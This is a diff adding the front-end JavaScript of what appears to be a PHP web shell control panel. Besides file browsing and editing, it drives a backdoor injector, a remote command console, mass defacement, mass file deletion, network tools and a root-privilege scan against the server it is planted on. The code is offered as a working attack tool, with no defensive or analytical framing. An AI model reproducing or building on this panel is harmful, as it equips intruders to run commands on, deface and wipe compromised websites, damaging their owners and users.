@@ -1,0 +1,277 @@
+document.addEventListener('DOMContentLoaded', function() {
+    // Get server-side variables from data attributes on the body
+    const body = document.body;
+    const currentPath = body.dataset.path;
+    const scriptUrl = body.dataset.url;
+    const flashMessage = body.dataset.flashMessage;
+
+    // --- Toast Notification Handler ---
+    function showToast(message, type = 'success') {
+        const toastId = 'toast-' + Date.now();
+        const toastHTML = `
+            <div id="${toastId}" class="toast align-items-center text-bg-${type} border-0" role="alert" aria-live="assertive" aria-atomic="true">
+                <div class="d-flex">
+                    <div class="toast-body">${message}</div>
+                    <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast" aria-label="Close"></button>
+                </div>
+            </div>`;
+        document.getElementById('toast-container').insertAdjacentHTML('beforeend', toastHTML);
+        const toastEl = document.getElementById(toastId);
+        const toast = new bootstrap.Toast(toastEl);
+        toast.show();
+        toastEl.addEventListener('hidden.bs.toast', () => toastEl.remove());
+    }
+
+    // Display flash message from PHP (e.g., after upload)
+    if (flashMessage) {
+        showToast(flashMessage);
+    }
+
+    // --- Core AJAX Request Handler ---
+    function ajaxRequest(data, successCallback, errorCallback) {
+        fetch(`${scriptUrl}?ajax=true&path=${encodeURIComponent(currentPath)}`, {
+                method: 'POST',
+                body: data
+            })
+            .then(response => response.json())
+            .then(successCallback)
+            .catch(error => {
+                console.error('Error:', error);
+                showToast('An unexpected error occurred.', 'danger');
+                if (errorCallback) errorCallback();
+            });
+    }
+
+    // --- Multiple Selection & Deletion Logic ---
+    const selectAll = document.getElementById('selectAll');
+    const checkboxes = document.querySelectorAll('.file-checkbox');
+    const deleteBtn = document.getElementById('deleteSelectedBtn');
+
+    function toggleDeleteButton() {
+        const checked = document.querySelectorAll('.file-checkbox:checked').length > 0;
+        deleteBtn.classList.toggle('d-none', !checked);
+    }
+
+    if (selectAll) {
+        selectAll.addEventListener('change', (e) => {
+            checkboxes.forEach(cb => cb.checked = e.target.checked);
+            toggleDeleteButton();
+        });
+
+        checkboxes.forEach(cb => {
+            cb.addEventListener('change', toggleDeleteButton);
+        });
+
+        deleteBtn.addEventListener('click', () => {
+            const selectedFiles = Array.from(document.querySelectorAll('.file-checkbox:checked')).map(cb => cb.value);
+            if (confirm(`Are you sure you want to delete ${selectedFiles.length} item(s)?`)) {
+                const formData = new FormData();
+                formData.append('action', 'delete_multiple');
+                selectedFiles.forEach(file => formData.append('files[]', file));
+
+                ajaxRequest(formData, data => {
+                    if (data.status === 'ok') {
+                        showToast(`Deleted ${data.success.length} items. ${data.errors.length} failed.`);
+                        if (data.success.length > 0) setTimeout(() => location.reload(), 1500);
+                    } else {
+                        showToast(data.message || 'Deletion failed.', 'danger');
+                    }
+                });
+            }
+        });
+    }
+
+
+    // --- Modal Form Handlers ---
+    
+    // Create File
+    const createFileForm = document.getElementById('createFileForm');
+    if (createFileForm) {
+        createFileForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const name = document.getElementById('newFileName').value;
+            const formData = new FormData();
+            formData.append('action', 'create_file');
+            formData.append('name', name);
+            ajaxRequest(formData, data => {
+                showToast(data.message, data.status === 'ok' ? 'success' : 'danger');
+                if (data.status === 'ok') setTimeout(() => location.reload(), 1000);
+            });
+        });
+    }
+
+    // Create Folder
+    const createFolderForm = document.getElementById('createFolderForm');
+    if(createFolderForm) {
+        createFolderForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const name = document.getElementById('newFolderName').value;
+            const formData = new FormData();
+            formData.append('action', 'create_folder');
+            formData.append('name', name);
+            ajaxRequest(formData, data => {
+                showToast(data.message, data.status === 'ok' ? 'success' : 'danger');
+                if (data.status === 'ok') setTimeout(() => location.reload(), 1000);
+            });
+        });
+    }
+    
+    // Backdoor Injector
+    const injectForm = document.getElementById('injectForm');
+    if (injectForm) {
+        injectForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            if (confirm('Are you sure you want to inject this backdoor? This can break the target file.')) {
+                const formData = new FormData(e.target);
+                formData.append('action', 'inject_backdoor');
+                ajaxRequest(formData, data => {
+                    showToast(data.message, data.status === 'ok' ? 'success' : 'danger');
+                    if (data.status === 'ok') {
+                        const injectModal = bootstrap.Modal.getInstance(document.getElementById('injectModal'));
+                        injectModal.hide();
+                    }
+                });
+            }
+        });
+    }
+
+    // Console
+    const cmdForm = document.getElementById('cmdForm');
+    if (cmdForm) {
+        cmdForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const cmdInput = document.getElementById('cmdInput');
+            const cmdOutput = document.getElementById('cmdOutput');
+            const cmd = cmdInput.value;
+
+            const formData = new FormData();
+            formData.append('action', 'cmd');
+            formData.append('cmd', cmd);
+
+            cmdOutput.innerHTML += `\n<span style="color:var(--primary-accent);">$ ${cmd}</span>\n`;
+            cmdOutput.scrollTop = cmdOutput.scrollHeight;
+
+            ajaxRequest(formData, data => {
+                if (data.status === 'ok') {
+                    cmdOutput.innerHTML += data.output;
+                } else {
+                    cmdOutput.innerHTML += 'Error executing command.';
+                }
+                cmdOutput.scrollTop = cmdOutput.scrollHeight;
+                cmdInput.value = '';
+            });
+        });
+    }
+
+    // Mass Actions (Deface & Delete)
+    const massDefaceForm = document.getElementById('massDefaceForm');
+    if (massDefaceForm) {
+        massDefaceForm.addEventListener('submit', e => {
+            e.preventDefault();
+            const outputEl = document.getElementById('massDefaceOutput');
+            outputEl.innerHTML = 'Processing...';
+            outputEl.classList.remove('d-none');
+            const formData = new FormData(e.target);
+            formData.append('action', 'mass_deface');
+            ajaxRequest(formData, data => outputEl.innerText = data.output);
+        });
+    }
+
+    const massDeleteForm = document.getElementById('massDeleteForm');
+    if (massDeleteForm) {
+        massDeleteForm.addEventListener('submit', e => {
+            e.preventDefault();
+            const outputEl = document.getElementById('massDeleteOutput');
+            outputEl.innerHTML = 'Processing...';
+            outputEl.classList.remove('d-none');
+            const formData = new FormData(e.target);
+            formData.append('action', 'mass_delete');
+            ajaxRequest(formData, data => outputEl.innerText = data.output);
+        });
+    }
+
+    // Network Tools
+    document.querySelectorAll('.network-form').forEach(form => {
+        form.addEventListener('submit', e => {
+            e.preventDefault();
+            const outputEl = document.getElementById('networkOutput');
+            outputEl.innerHTML = 'Executing...';
+            outputEl.classList.remove('d-none');
+            const formData = new FormData(e.target);
+            formData.append('action', 'network');
+            ajaxRequest(formData, data => outputEl.innerText = data.output);
+        });
+    });
+    
+    // --- Global Functions for inline `onclick` attributes ---
+
+    // Viewer/Editor Modal
+    const editorModalEl = document.getElementById('editorModal');
+    if(editorModalEl) {
+        const editorModal = new bootstrap.Modal(editorModalEl);
+        const editorFileName = document.getElementById('editorFileName');
+        const editorContent = document.getElementById('editorContent');
+        const saveFileBtn = document.getElementById('saveFileBtn');
+        let currentEditingFile = '';
+    
+        window.viewItem = function(file) {
+            editItem(file, true);
+        }
+    
+        window.editItem = function(file, readOnly = false) {
+            currentEditingFile = file;
+            editorFileName.textContent = (readOnly ? 'Viewing: ' : 'Editing: ') + file;
+            editorContent.value = 'Loading content...';
+            editorContent.readOnly = readOnly;
+            saveFileBtn.style.display = readOnly ? 'none' : 'block';
+    
+            const formData = new FormData();
+            formData.append('action', 'get_content');
+            formData.append('file', file);
+    
+            ajaxRequest(formData, data => {
+                editorContent.value = (data.status === 'ok') ? data.content : data.message;
+                editorModal.show();
+            });
+        }
+    
+        saveFileBtn.addEventListener('click', function() {
+            const formData = new FormData();
+            formData.append('action', 'save_content');
+            formData.append('file', currentEditingFile);
+            formData.append('content', editorContent.value);
+    
+            ajaxRequest(formData, data => {
+                showToast(data.message, data.status === 'ok' ? 'success' : 'danger');
+                if (data.status === 'ok') editorModal.hide();
+            });
+        });
+    }
+
+    // Rename Item
+    window.renameItem = function(item) {
+        const newName = prompt(`Enter new name for "${item}":`, item);
+        if (newName && newName !== item) {
+            const formData = new FormData();
+            formData.append('action', 'rename');
+            formData.append('old', item);
+            formData.append('new', newName);
+
+            ajaxRequest(formData, data => {
+                showToast(data.message, data.status === 'ok' ? 'success' : 'danger');
+                if (data.status === 'ok') setTimeout(() => location.reload(), 1000);
+            });
+        }
+    }
+
+    // Scan Root
+    window.scanRoot = function(type) {
+        const outputEl = document.getElementById('scanRootOutput');
+        outputEl.innerHTML = `[+] Starting ${type} scan... This may take a while.`;
+        fetch(`${scriptUrl}?ajax=true&path=${encodeURIComponent(currentPath)}&action=scan_root&type=${type}`)
+            .then(res => res.json())
+            .then(data => {
+                outputEl.innerText = data.output;
+            });
+    }
+});
